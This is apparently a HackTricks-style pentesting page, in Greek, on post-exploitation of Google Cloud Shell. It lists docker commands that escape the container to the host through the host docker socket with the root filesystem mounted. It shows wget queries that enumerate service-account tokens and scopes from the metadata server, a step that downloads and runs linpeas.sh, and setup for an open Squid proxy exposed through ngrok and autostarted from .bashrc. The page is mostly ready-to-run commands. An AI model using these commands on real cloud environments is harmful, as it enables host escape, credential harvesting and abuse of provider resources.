# GCP - Cloud Shell Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Για περισσότερες πληροφορίες σχετικά με το Cloud Shell, ελέγξτε:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Container Escape

Σημειώστε ότι το Google Cloud Shell εκτελείται μέσα σε ένα κοντέινερ, μπορείτε **εύκολα να διαφύγετε στον οικοδεσπότη** κάνοντας:
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
Αυτό δεν θεωρείται ευπάθεια από την Google, αλλά σας δίνει μια ευρύτερη εικόνα του τι συμβαίνει σε αυτό το περιβάλλον.

Επιπλέον, σημειώστε ότι από τον κεντρικό υπολογιστή μπορείτε να βρείτε ένα διακριτικό λογαριασμού υπηρεσίας:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
Με τους παρακάτω τομείς:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
Αναγνωρίστε τα μεταδεδομένα με το LinPEAS:
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
Μετά τη χρήση του [https://github.com/carlospolop/bf_my_gcp_permissions](https://github.com/carlospolop/bf_my_gcp_permissions) με το token του Service Account **δεν ανακαλύφθηκε καμία άδεια**...

### Χρησιμοποιήστε το ως Proxy

Αν θέλετε να χρησιμοποιήσετε την instance του google cloud shell σας ως proxy, πρέπει να εκτελέσετε τις παρακάτω εντολές (ή να τις εισάγετε στο αρχείο .bashrc):
```bash
sudo apt install -y squid
```
Απλώς για να σας ενημερώσω, το Squid είναι ένας διακομιστής http proxy. Δημιουργήστε ένα **squid.conf** αρχείο με τις παρακάτω ρυθμίσεις:
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
αντιγράψτε το **squid.conf** αρχείο στο **/etc/squid**
```bash
sudo cp squid.conf /etc/squid
```
Τέλος, εκτελέστε την υπηρεσία squid:
```bash
sudo service squid start
```
Χρησιμοποιήστε το ngrok για να καταστήσετε τον διακομιστή μεσολάβησης διαθέσιμο από έξω:
```bash
./ngrok tcp 3128
```
Μετά την εκτέλεση, αντιγράψτε το tcp:// url. Αν θέλετε να εκτελέσετε τον proxy από έναν περιηγητή, προτείνεται να αφαιρέσετε το tcp:// μέρος και την θύρα και να βάλετε την θύρα στο πεδίο θύρας των ρυθμίσεων proxy του περιηγητή σας (το squid είναι ένας http proxy server).

Για καλύτερη χρήση κατά την εκκίνηση, το αρχείο .bashrc θα πρέπει να έχει τις εξής γραμμές:
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
Οι οδηγίες αντιγράφηκαν από [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). Ελέγξτε αυτή τη σελίδα για άλλες τρελές ιδέες για να εκτελέσετε οποιοδήποτε είδος λογισμικού (βάσεις δεδομένων και ακόμη και Windows) στο Cloud Shell.

{{#include ../../../banners/hacktricks-training.md}}
